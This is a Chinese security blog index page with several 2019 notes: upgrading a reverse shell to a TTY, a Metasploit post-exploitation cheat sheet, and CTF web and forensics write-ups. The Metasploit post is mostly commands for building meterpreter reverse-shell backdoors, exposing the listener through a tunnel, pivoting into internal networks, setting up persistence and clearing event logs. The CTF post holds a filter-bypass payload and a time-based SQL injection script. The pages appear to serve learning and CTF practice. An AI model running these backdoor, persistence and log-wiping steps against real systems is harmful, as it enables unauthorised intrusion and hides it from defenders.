<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Hexo</title>

  
  <meta name="author" content="John Doe">
  

  

  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  

  <meta property="og:site_name" content="Hexo"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
</head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">Hexo</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    
  <article>

  
    
    <h3 class="article-title"><a href="/2019/07/22/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-1/"><span>内网渗透_1</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/07/22/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-1/" rel="bookmark">
        <time class="entry-date published" datetime="2019-07-22T03:26:49.000Z">
          2019-07-22
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a><em><strong>0x01</strong></em></h1><h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a><em><strong>reverse shell</strong></em></h2><h3 id="由于一般bash-反弹shell的本质是对终端std流的重定向，本地nc接受的反弹shell并非一个具有完整功能的tty终端，例如su、ssh、进入docker容器等常用的功能均无法正常使用，可以说只是一个强化版的webshell，所以最好是将reverse-shell提升为一个真正的tty-shell-。"><a href="#由于一般bash-反弹shell的本质是对终端std流的重定向，本地nc接受的反弹shell并非一个具有完整功能的tty终端，例如su、ssh、进入docker容器等常用的功能均无法正常使用，可以说只是一个强化版的webshell，所以最好是将reverse-shell提升为一个真正的tty-shell-。" class="headerlink" title="由于一般bash_反弹shell的本质是对终端std流的重定向，本地nc接受的反弹shell并非一个具有完整功能的tty终端，例如su、ssh、进入docker容器等常用的功能均无法正常使用，可以说只是一个强化版的webshell，所以最好是将reverse shell提升为一个真正的tty shell_。"></a>由于一般<em><strong>bash</strong>_反弹</em><strong>shell</strong><em>的本质是对终端</em><strong>std</strong><em>流的重定向，本地</em><strong>nc</strong><em>接受的反弹</em><strong>shell</strong><em>并非一个具有完整功能的</em><strong>tty</strong><em>终端，例如</em><strong>su</strong><em>、</em><strong>ssh</strong><em>、进入</em><strong>docker</strong><em>容器等常用的功能均无法正常使用，可以说只是一个强化版的</em><strong>webshell</strong><em>，所以最好是将</em><strong>reverse shell</strong><em>提升为一个真正的</em><strong>tty shell</strong>_。</h3><h3 id="α-reverse-shell"><a href="#α-reverse-shell" class="headerlink" title="α_reverse_shell:"></a><em><strong>α_reverse_shell:</strong></em></h3><h3 id="python-c-‘import-pty-pty-spawn-“-bin-bash”-’-info"><a href="#python-c-‘import-pty-pty-spawn-“-bin-bash”-’-info" class="headerlink" title="python -c ‘import pty; pty.spawn(“/bin/bash”)’       #info"></a><em><strong>python -c ‘import pty; pty.spawn(“/bin/bash”)’       #<a href="https://cloud.tencent.com/developer/section/1372585" target="_blank" rel="noopener">info</a></strong></em></h3><h3 id="β-local-shell"><a href="#β-local-shell" class="headerlink" title="β_local_shell:"></a><em><strong>β_local_shell:</strong></em></h3><h3 id="Z-挂起"><a href="#Z-挂起" class="headerlink" title="*^Z *       #挂起"></a><em>*<em>^Z *</em></em>       #挂起</h3><h3 id="stty-raw-echo-不过一般stty-对stdin不是stdout-操作。"><a href="#stty-raw-echo-不过一般stty-对stdin不是stdout-操作。" class="headerlink" title="stty raw -echo       #不过一般stty_对stdin不是stdout_操作。"></a><em><strong>stty raw -echo</strong></em>       #不过一般<em><strong>stty</strong>_对</em><strong>stdin</strong><em>不是</em><strong>stdout</strong>_操作。</h3><h3 id="fg-唤起后台程序"><a href="#fg-唤起后台程序" class="headerlink" title="*fg *     #唤起后台程序"></a><em>*<em>fg *</em></em>     #唤起后台程序</h3><h3 id="γ-reverse-shell"><a href="#γ-reverse-shell" class="headerlink" title="γ_reverse_shell:"></a><em><strong>γ_reverse_shell:</strong></em></h3><h3 id="reset-export-SHELL-bash-懂得都懂-export-TERM-xterm256-color-stty-rows-38-columns-116"><a href="#reset-export-SHELL-bash-懂得都懂-export-TERM-xterm256-color-stty-rows-38-columns-116" class="headerlink" title="reset *export SHELL=bash                     * #懂得都懂 export TERM=xterm256-color stty rows 38 columns 116"></a><em><strong>reset</strong></em> <em>*<em>export SHELL=bash                     *</em></em> <strong>#懂得都懂</strong> <em><strong>export TERM=xterm256-color</strong></em> <em><strong>stty rows 38 columns 116</strong></em></h3><p><img src="https://www.highker.wiki/wp-content/uploads/2019/07/TIM%E6%88%AA%E5%9B%BE20190722111241.png" alt=""></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/笔记/">笔记</a>
    </span>
    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/06/17/msf-meterpreter-1/"><span>msf_meterpreter_1</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/06/17/msf-meterpreter-1/" rel="bookmark">
        <time class="entry-date published" datetime="2019-06-17T08:37:25.000Z">
          2019-06-17
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="0x01-生成远控后门-无免杀，找免杀请移步别处"><a href="#0x01-生成远控后门-无免杀，找免杀请移步别处" class="headerlink" title="0x01 生成远控后门(无免杀，找免杀请移步别处"></a><strong><em>0x01</em> 生成远控后门(无免杀，找免杀请移步别处</strong></h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows :"></a><em><strong>windows :</strong></em></h3><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a><strong>反向连接</strong></h3><blockquote>
<p><em><strong>&gt; msfvenom -p windows/meterpreter/reverse_tcp lhost=</strong></em><strong>反弹</strong><em><strong>IP lport=</strong></em><strong>反弹端口</strong> <em><strong>-f exe -o</strong></em> <strong>文件名</strong></p>
</blockquote>
<h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a><strong>正向连接</strong></h3><blockquote>
<p><em><strong>&gt; msfvenom -p windows/meterpreter/bind_tcp lport=</strong></em><strong>监听端口</strong> <em><strong>-f exe -o</strong></em> <strong>文件名</strong></p>
</blockquote>
<h3 id="linux"><a href="#linux" class="headerlink" title="linux:"></a><em><strong>linux:</strong></em></h3><h3 id="反向连接-1"><a href="#反向连接-1" class="headerlink" title="反向连接"></a><strong>反向连接</strong></h3><blockquote>
<p><em><strong>&gt; msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=</strong></em><strong>反弹</strong><em><strong>IP lport=</strong></em><strong>反弹端口</strong> <em><strong>-f elf -o</strong></em> <strong>文件名</strong></p>
</blockquote>
<h3 id="正向连接-1"><a href="#正向连接-1" class="headerlink" title="正向连接"></a><strong>正向连接</strong></h3><blockquote>
<p><em><strong>&gt; msfvenom -p linux/x86/meterpreter/bind_tcp lport=</strong></em><strong>监听端口</strong> <em><strong>-f elf -o</strong></em> <strong>文件名</strong></p>
</blockquote>
<h2 id="0x02-映射本地-msf-到公网"><a href="#0x02-映射本地-msf-到公网" class="headerlink" title="0x02 映射本地_msf_到公网"></a><strong><em>0x02</em> 映射本地_msf_到公网</strong></h2><h3 id="解决方案很多，我用的是sunny-ngrok"><a href="#解决方案很多，我用的是sunny-ngrok" class="headerlink" title="解决方案很多，我用的是sunny ngrok"></a><strong>解决方案很多，我用的是<em><a href="https://www.ngrok.cc" target="_blank" rel="noopener">sunny ngrok</a></em></strong></h3><h3 id="使用很简单，后台创建好-tcp-隧道，本地一条命令了事"><a href="#使用很简单，后台创建好-tcp-隧道，本地一条命令了事" class="headerlink" title="使用很简单，后台创建好_tcp_隧道，本地一条命令了事"></a><strong>使用很简单，后台创建好_tcp_隧道，本地一条命令了事</strong></h3><blockquote>
<p><em><strong>&gt; ~/Desktop# ./sunny clientid ID</strong></em></p>
</blockquote>
<h2 id="0x03-创建会话"><a href="#0x03-创建会话" class="headerlink" title="0x03 创建会话"></a><strong><em>0x03</em> 创建会话</strong></h2><blockquote>
<p><em><strong>&gt; use exploit/multi/handler</strong></em> <em><strong>&gt; set payload windows/meterpreter/reverse_tcp</strong></em> <em><strong>&gt; set lhost 127.0.0.1</strong></em> <em><strong>&gt; set lport</strong></em> <strong>本机监听端口</strong> <em><strong>&gt; run</strong></em></p>
</blockquote>
<h2 id="0x04-获取信息"><a href="#0x04-获取信息" class="headerlink" title="0x04 获取信息"></a><strong><em>0x04</em> 获取信息</strong></h2><h3 id="查看用户"><a href="#查看用户" class="headerlink" title="查看用户"></a><strong>查看用户</strong></h3><blockquote>
<p><em><strong>&gt; getuid</strong></em></p>
</blockquote>
<h3 id="查看补丁"><a href="#查看补丁" class="headerlink" title="查看补丁"></a><strong>查看补丁</strong></h3><blockquote>
<p><em><strong>&gt; run post/windows/gather/enum_patches</strong></em></p>
</blockquote>
<h3 id="根据版本号可以使用相关的-exp-进行提权，也可以使用-meterpreter-自带的-getsystem-模块"><a href="#根据版本号可以使用相关的-exp-进行提权，也可以使用-meterpreter-自带的-getsystem-模块" class="headerlink" title="根据版本号可以使用相关的_exp_进行提权，也可以使用_meterpreter_自带的_getsystem_模块"></a><strong>根据版本号可以使用相关的_exp_进行提权，也可以使用_meterpreter_自带的_getsystem_模块</strong></h3><h3 id="使用shell-可以打开-cmd"><a href="#使用shell-可以打开-cmd" class="headerlink" title="使用shell_可以打开_cmd"></a><strong>使用<em>shell_可以打开_cmd</em></strong></h3><h3 id="通过查询-arp-缓存表，网卡配置等可以对内网机器进行下一步攻击"><a href="#通过查询-arp-缓存表，网卡配置等可以对内网机器进行下一步攻击" class="headerlink" title="通过查询_arp_缓存表，网卡配置等可以对内网机器进行下一步攻击"></a><strong>通过查询_arp_缓存表，网卡配置等可以对内网机器进行下一步攻击</strong></h3><blockquote>
<p><em><strong>&gt; arp -a</strong></em><br><em><strong>&gt; ipconfig /all</strong></em></p>
</blockquote>
<h2 id="0x05-网络代理"><a href="#0x05-网络代理" class="headerlink" title="0x05 网络代理"></a><strong><em>0x05</em> 网络代理</strong></h2><h3 id="由得到的网卡信息，添加路由"><a href="#由得到的网卡信息，添加路由" class="headerlink" title="由得到的网卡信息，添加路由"></a><strong>由得到的网卡信息，添加路由</strong></h3><blockquote>
<p><em><strong>&gt; run get_local_subnets</strong></em><br><em><strong>&gt; run autoroute -s x.x.x.x/x</strong></em></p>
</blockquote>
<h3 id="验证添加的路由"><a href="#验证添加的路由" class="headerlink" title="验证添加的路由"></a><strong>验证添加的路由</strong></h3><blockquote>
<p><em><strong>&gt; run autoroute -p</strong></em></p>
</blockquote>
<h3 id="添加路由之后可以使用-meterpreter-做代理，也可以使用-socks-proxychains-的方法代理"><a href="#添加路由之后可以使用-meterpreter-做代理，也可以使用-socks-proxychains-的方法代理" class="headerlink" title="添加路由之后可以使用_meterpreter_做代理，也可以使用_socks+proxychains_的方法代理"></a><strong>添加路由之后可以使用_meterpreter_做代理，也可以使用_socks+proxychains_的方法代理</strong></h3><h3 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a><em><strong>meterpreter</strong></em></h3><blockquote>
<p><em><strong>&gt; getproxy</strong></em></p>
</blockquote>
<h3 id="socks-proxychains"><a href="#socks-proxychains" class="headerlink" title="socks+proxychains"></a><em><strong>socks+proxychains</strong></em></h3><blockquote>
<p><em><strong>&gt; use auxiliary/server/socks4a</strong></em><br><em><strong>&gt; proxychains xxx</strong></em></p>
</blockquote>
<h2 id="0x06-内网扫描"><a href="#0x06-内网扫描" class="headerlink" title="0x06 内网扫描"></a><strong><em>0x06</em> 内网扫描</strong></h2><h3 id="由于上面添加了路由，可以直接使用db-nmap-扫描，但是-pivot-只能在-msf-中用，想使用-msf-以外的脚本还得是-proxychains"><a href="#由于上面添加了路由，可以直接使用db-nmap-扫描，但是-pivot-只能在-msf-中用，想使用-msf-以外的脚本还得是-proxychains" class="headerlink" title="由于上面添加了路由，可以直接使用db_nmap_扫描，但是_pivot_只能在_msf_中用，想使用_msf_以外的脚本还得是_proxychains"></a><strong>由于上面添加了路由，可以直接使用<em>db_nmap_扫描，但是_pivot_只能在_msf_中用，想使用_msf_以外的脚本还得是_proxychains</em></strong></h3><blockquote>
<p><em><strong>&gt; db_nmap -sV</strong></em> <strong>目标IP/划分子网</strong></p>
</blockquote>
<h3 id="db-nmap-还会自动将扫描结果写入数据库"><a href="#db-nmap-还会自动将扫描结果写入数据库" class="headerlink" title="_db_nmap_还会自动将扫描结果写入数据库"></a><strong>_db_nmap_还会自动将扫描结果写入数据库</strong></h3><blockquote>
<p><em><strong>&gt; services</strong></em></p>
</blockquote>
<h2 id="0x07-端口转发"><a href="#0x07-端口转发" class="headerlink" title="0x07 端口转发"></a><strong><em>0x07</em> 端口转发</strong></h2><h3 id="使用-meterpreter-内置的-portfwd-，或者-lcx-Linux有portmap-等工具"><a href="#使用-meterpreter-内置的-portfwd-，或者-lcx-Linux有portmap-等工具" class="headerlink" title="使用_meterpreter_内置的_portfwd_，或者_lcx(Linux有portmap)_等工具"></a><strong>使用_meterpreter_内置的_portfwd_，或者_lcx(Linux有portmap)_等工具</strong></h3><h3 id="portfwd"><a href="#portfwd" class="headerlink" title="portfwd:"></a><em><strong>portfwd:</strong></em></h3><blockquote>
<p><em><strong>&gt; portfwd add -l 6666 -p 3389 -r 127.0.0.1</strong></em><br><em><strong>&gt; rdesktop 127.0.0.1:6666</strong></em></p>
</blockquote>
<h3 id="lcx"><a href="#lcx" class="headerlink" title="lcx:"></a><em><strong>lcx:</strong></em></h3><blockquote>
<p><strong><em>&gt; lcx.exe -listen 3333 4444</em> #监听机</strong><br><strong><em>&gt; lcx.exe -slave</em> 监听机<em>ip port 127.0.0.1 3389</em></strong></p>
</blockquote>
<h2 id="0x08-长期维权"><a href="#0x08-长期维权" class="headerlink" title="0x08 长期维权"></a><strong><em>0x08</em> 长期维权</strong></h2><h3 id="meterpreter-会话不适合长期维持权限，但是可以使用它内置的-persistentce-模块写入，或者-metmvc-创建服务"><a href="#meterpreter-会话不适合长期维持权限，但是可以使用它内置的-persistentce-模块写入，或者-metmvc-创建服务" class="headerlink" title="_meterpreter_会话不适合长期维持权限，但是可以使用它内置的_persistentce_模块写入，或者_metmvc_创建服务"></a><strong>_meterpreter_会话不适合长期维持权限，但是可以使用它内置的_persistentce_模块写入，或者_metmvc_创建服务</strong></h3><h3 id="persistence"><a href="#persistence" class="headerlink" title="persistence:"></a><em><strong>persistence:</strong></em></h3><blockquote>
<p><strong><em>&gt; run persistence -X -i 10 -p</em> 端口 <em>-r</em> 反向连接<em>IP</em></strong></p>
</blockquote>
<h3 id="metmvc"><a href="#metmvc" class="headerlink" title="metmvc:"></a><em><strong>metmvc:</strong></em></h3><blockquote>
<p><em><strong>&gt; run metsvc -A</strong></em></p>
</blockquote>
<h2 id="0x09-脚底抹油"><a href="#0x09-脚底抹油" class="headerlink" title="0x09 脚底抹油"></a><strong>0x09 脚底抹油</strong></h2><blockquote>
<p><em><strong>&gt; clearev</strong></em></p>
</blockquote>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/笔记/">笔记</a>
    </span>
    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/06/10/ciscn-1-2-web/"><span>ciscn_1/2_web</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/06/10/ciscn-1-2-web/" rel="bookmark">
        <time class="entry-date published" datetime="2019-06-10T06:54:35.000Z">
          2019-06-10
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="day-2"><a href="#day-2" class="headerlink" title="day_2"></a><em><strong>day_2</strong></em></h1><h2 id="web-2"><a href="#web-2" class="headerlink" title="web_2"></a><em><strong>web_2</strong></em></h2><p>_**echo “Null … Null … Null … “;</p>
<p>if(isset($_GET[‘src’])) {<br>    die(highlight_file(‘index.php’, true));<br>}</p>
<p>error_reporting(0);<br>if($_REQUEST){<br>    foreach ($_REQUEST as $key =&gt; $value) {<br>        if(preg_match(‘/[a-zA-Z]/i’, $value)) die(‘Hello Hack.’);<br>    }<br>}</p>
<p>if($_SERVER){<br>    if(preg_match(‘/cyber|flag|ciscn/i’, $_SERVER[‘QUERY_STRING’])) die(‘Hello Hack..’);<br>}</p>
<p>if(isset($<em>GET[‘cyber’])){<br>    if(!(substr($_GET[‘cyber’], 32) === md5($_GET[‘cyber’]))){<br>        die(‘Hello Hack…’);<br>    }else{<br>        if(preg_match(‘/^ciscnsec$/‘, $_GET[‘ciscn’]) &amp;&amp; $_GET[‘ciscn’] !== ‘ciscnsec’){<br>            $getflag = file_get_contents($_GET[‘flag’]);<br>        }else<br>            die(‘Hello Hack….’);<br>        if(isset($getflag) &amp;&amp; $getflag === ‘security’){<br>            include ‘flag.php’;<br>            echo $flag;<br>        }else die(‘Hello Hack…..’);<br>    }<br>}**</em></p>
<h3 id="首先是第一个check-，post上去一个与key-一样的数字就行"><a href="#首先是第一个check-，post上去一个与key-一样的数字就行" class="headerlink" title="首先是第一个check_，post上去一个与key_一样的数字就行"></a>首先是第一个<em><strong>check</strong>_，</em><strong>post</strong><em>上去一个与</em><strong>key</strong>_一样的数字就行</h3><h3 id="第二个check-因为是-SERVER-‘QUERY-STRING’-获取的uri，所以可以经过url-编码直接搞定"><a href="#第二个check-因为是-SERVER-‘QUERY-STRING’-获取的uri，所以可以经过url-编码直接搞定" class="headerlink" title="第二个check_因为是$_SERVER[‘QUERY_STRING’]获取的uri，所以可以经过url_编码直接搞定"></a>第二个<em><strong>check</strong>_因为是</em><strong>$_SERVER[‘QUERY_STRING’]</strong><em>获取的</em><strong>uri</strong><em>，所以可以经过</em><strong>url</strong>_编码直接搞定</h3><h3 id="第三个-check-很常见，提交数组格式完成绕过"><a href="#第三个-check-很常见，提交数组格式完成绕过" class="headerlink" title="第三个_check_很常见，提交数组格式完成绕过"></a>第三个_<strong>check</strong>_很常见，提交数组格式完成绕过</h3><h3 id="第四个check-关键点在于preg-match的多个模式，由于没有开启-d，那么用-0a-换行即可"><a href="#第四个check-关键点在于preg-match的多个模式，由于没有开启-d，那么用-0a-换行即可" class="headerlink" title="第四个check_关键点在于preg_match的多个模式，由于没有开启/d，那么用%0a_换行即可"></a>第四个<em><strong>check</strong>_关键点在于</em><strong>preg_match</strong><em>的多个模式，由于没有开启</em><strong>/d</strong><em>，那么用</em><strong>%0a</strong>_换行即可</h3><h3 id="第五个check-可以看看php伪协议，使用data-text-plain-security-通过最后一段校验"><a href="#第五个check-可以看看php伪协议，使用data-text-plain-security-通过最后一段校验" class="headerlink" title="第五个check_可以看看php伪协议，使用data://text/plain,security_通过最后一段校验"></a>第五个<em><strong>check</strong>_可以看看<a href="https://www.highker.wiki/ctf/web/php_protocols.html" target="_blank" rel="noopener">php伪协议</a>，使用</em><strong>data://text/plain,security</strong>_通过最后一段校验</h3><h3 id="最终payload"><a href="#最终payload" class="headerlink" title="最终payload"></a>最终<strong><em>payload</em></strong></h3><p><em>*_POST /?%63%79%62%65%72%5b%5d&amp;%63%69%73%63%6e=%63%69%73%63%6e%73%65%63%0a&amp;%66%6c%61%67=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%73%65%63%75%72%69%74%79 HTTP/1.1<br>Host: 127.0.0.1:8888<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,</em>/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 18<br>Connection: close<br>Upgrade-Insecure-Requests: 1</p>
<p>ciscn=777&amp;flag=777_** </p>
<h2 id="web-1"><a href="#web-1" class="headerlink" title="web_1"></a><strong><em>web_1</em></strong></h2><h3 id="很简单的一个time-based-sql-injection-，因为一开始直接告诉了表名和列名，并且预先知道-flag-格式与长度，可以只跑-6-15-位，直接贴-payload"><a href="#很简单的一个time-based-sql-injection-，因为一开始直接告诉了表名和列名，并且预先知道-flag-格式与长度，可以只跑-6-15-位，直接贴-payload" class="headerlink" title="很简单的一个time based sql injection_，因为一开始直接告诉了表名和列名，并且预先知道_flag_格式与长度，可以只跑_6~15_位，直接贴_payload"></a><strong>很简单的一个<em>time based sql injection_，因为一开始直接告诉了表名和列名，并且预先知道_flag_格式与长度，可以只跑_6~15_位，直接贴_payload</em></strong></h3><p><strong><em>import requests</em></strong><br><strong><em>import time</em></strong><br><strong><em>url = “<a href="http://localhost:8888/web1/index.php&quot;" target="_blank" rel="noopener">http://localhost:8888/web1/index.php&quot;</a></em></strong><br><strong><em>list = “1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM{}</em>!@#$%^&amp;*()”_</strong><br><strong><em>flag = “”</em></strong><br><strong><em>payload = ‘elt(ascii(substr((select(flag)from(ctf)),{q},1))={attack},sleep(1))’</em></strong><br> <strong><em>for a in range(6,16):</em></strong><br> <strong><em>for l in list:</em></strong><br> <strong><em>data = {“id”:payload.format(q=a,attack=ord(l))}</em></strong><br> <strong><em>start = time.time()</em></strong><br> <strong><em>req = requests.post(url, data = data)</em></strong><br> <strong><em>if time.time()-start &gt; 2:</em></strong><br> <strong><em>flag += l</em></strong><br> <strong><em>print flag</em></strong><br> <strong><em>break</em></strong></p>
<p>*<em>下面是它的源码 *</em></p>
<p><em><strong>$dbuser=’root’;</strong></em><br><em><strong>//$dbuser=’root’;</strong></em><br><em><strong>$dbpass=’root’;</strong></em><br><em><strong>//$dbpass=’root’;</strong></em><br><em><strong>function safe($sql){</strong></em><br> <em><strong>$blackList = array(‘ ‘,’||’,’#’,’-‘,’;’,’&amp;’,’+’,’or’,’and’,’`’,’”‘,’insert’,’group’,’limit’,’update’,’delete’,’*’,’into’,’union’,’load_file’,’outfile’,’./‘);</strong></em><br> <em><strong>foreach($blackList as $blackitem){</strong></em><br> <em><strong>if(stripos($sql,$blackitem)){</strong></em><br> <em><strong>return False;</strong></em><br> <em><strong>}</strong></em><br> <em><strong>}</strong></em><br> <em><strong>return True;</strong></em><br><em><strong>}</strong></em><br><em><strong>if(isset($_POST[‘id’])){</strong></em><br> <em><strong>$id = $_POST[‘id’];</strong></em><br><em><strong>}else{</strong></em><br> <em><strong>die();</strong></em><br><em><strong>}</strong></em><br><em><strong>$db = mysql_connect(“localhost”,$dbuser,$dbpass);</strong></em><br><em><strong>if(!$db){</strong></em><br> <em><strong>die(mysql_error());</strong></em><br><em><strong>}</strong></em><br><em><strong>mysql_select_db(“ctf”,$db);</strong></em><br><em><strong>if(safe($id)){</strong></em><br> <em><strong>$query = mysql_query(“SELECT content from passage WHERE id = ${id} limit 0,1”);</strong></em><br> <em><strong>if($query){</strong></em><br> <em><strong>$result = mysql_fetch_array($query);</strong></em><br>        <strong>if($result){</strong><br> <em><strong>echo $result[‘content’];</strong></em><br> <em><strong>}else{</strong></em><br> <em><strong>echo “Error Occured When Fetch Result.”;</strong></em><br> <em><strong>}</strong></em><br> <em><strong>}else{</strong></em><br> <em><strong>var_dump($query);</strong></em><br> <em><strong>}</strong></em> <em><strong>}else{</strong></em><br> <em><strong>die(“SQL Injection Checked.”);</strong></em><br><em><strong>}</strong></em></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/web/">web</a>
    </span>
    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/05/04/csactf2019/"><span>CSACTF2019</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/05/04/csactf2019/" rel="bookmark">
        <time class="entry-date published" datetime="2019-05-04T06:45:05.000Z">
          2019-05-04
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a><strong><em>Reconnaissance</em></strong></h1><h2 id="We-are-CSA"><a href="#We-are-CSA" class="headerlink" title="We are CSA"></a><em><strong>We are CSA</strong></em></h2><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a><strong><em>0x01</em></strong></h2><h3 id="刚看到这个的时候真的特迷。。点半天点不动，还以为是没挂梯子有东西没加载出来的问题，后来仔细一想尼玛准是F12"><a href="#刚看到这个的时候真的特迷。。点半天点不动，还以为是没挂梯子有东西没加载出来的问题，后来仔细一想尼玛准是F12" class="headerlink" title="刚看到这个的时候真的特迷。。点半天点不动，还以为是没挂梯子有东西没加载出来的问题，后来仔细一想尼玛准是F12"></a><strong>刚看到这个的时候真的特迷。。点半天点不动，还以为是没挂梯子有东西没加载出来的问题，后来仔细一想尼玛准是<em>F12</em></strong></h3><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://www.highker.wiki/wp-content/uploads/2019/05/TIM%E6%88%AA%E5%9B%BE20190504134734.png" alt=""></h3><h3 id="成功得到第一部分"><a href="#成功得到第一部分" class="headerlink" title="成功得到第一部分"></a><strong>成功得到第一部分</strong></h3><p><img src="https://www.highker.wiki/wp-content/uploads/2019/05/TIM%E6%88%AA%E5%9B%BE20190504135029.png" alt=""></p>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a><strong><em>0x02</em></strong></h2><h3 id="根据提示到逆向区找到了第二部分"><a href="#根据提示到逆向区找到了第二部分" class="headerlink" title="根据提示到逆向区找到了第二部分"></a><strong>根据提示到逆向区找到了第二部分</strong></h3><p><img src="https://www.highker.wiki/wp-content/uploads/2019/05/TIM%E6%88%AA%E5%9B%BE20190504135401.png" alt=""></p>
<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a><em><strong>0x03</strong></em></h2><h3 id="在这名成员的站点找到第三部分"><a href="#在这名成员的站点找到第三部分" class="headerlink" title="在这名成员的站点找到第三部分"></a><strong>在这名成员的站点找到第三部分</strong></h3><p><img src="https://www.highker.wiki/wp-content/uploads/2019/05/TIM%E6%88%AA%E5%9B%BE20190504135556.png" alt=""></p>
<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a><em><strong>0x04</strong></em></h2><h3 id="最后一部分费我时间最长。。以为是社工出画师的信息，油管、推特、-github-等地方翻了个底朝天都没找到，后来想到会不会和人没有关系，信息藏在-logo-本身中，最后在文件尾找到了第四部分，-base64-解码一下"><a href="#最后一部分费我时间最长。。以为是社工出画师的信息，油管、推特、-github-等地方翻了个底朝天都没找到，后来想到会不会和人没有关系，信息藏在-logo-本身中，最后在文件尾找到了第四部分，-base64-解码一下" class="headerlink" title="最后一部分费我时间最长。。以为是社工出画师的信息，油管、推特、_github_等地方翻了个底朝天都没找到，后来想到会不会和人没有关系，信息藏在_logo_本身中，最后在文件尾找到了第四部分，_base64_解码一下"></a><strong>最后一部分费我时间最长。。以为是社工出画师的信息，油管、推特、_github_等地方翻了个底朝天都没找到，后来想到会不会和人没有关系，信息藏在_logo_本身中，最后在文件尾找到了第四部分，_base64_解码一下</strong></h3><p><img src="https://www.highker.wiki/wp-content/uploads/2019/05/TIM%E6%88%AA%E5%9B%BE20190504135849.png" alt=""> <img src="https://www.highker.wiki/wp-content/uploads/2019/05/TIM%E6%88%AA%E5%9B%BE20190504140138.png" alt=""></p>
<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a><em><strong>Forensics</strong></em></h1><h2 id="Zippy"><a href="#Zippy" class="headerlink" title="Zippy"></a><em><strong>Zippy</strong></em></h2><h3 id="下载下来是一个-zip-包-HxD-看一下，发现文件头被-00-覆盖，手动修复即可"><a href="#下载下来是一个-zip-包-HxD-看一下，发现文件头被-00-覆盖，手动修复即可" class="headerlink" title="下载下来是一个_zip_包,_HxD_看一下，发现文件头被_00_覆盖，手动修复即可"></a><strong>下载下来是一个_zip_包,_HxD_看一下，发现文件头被_00_覆盖，手动修复即可</strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/05/TIM%E6%88%AA%E5%9B%BE20190504141043.png" alt=""></strong> <strong><img src="https://www.highker.wiki/wp-content/uploads/2019/05/TIM%E6%88%AA%E5%9B%BE20190504141123.png" alt=""></strong></p>
<h3 id="解压得到flag"><a href="#解压得到flag" class="headerlink" title="解压得到flag"></a><strong>解压得到<em>flag</em></strong></h3><p><strong><img src="https://www.highker.wiki/wp-content/uploads/2019/05/TIM%E6%88%AA%E5%9B%BE20190504141200.png" alt=""></strong></p>
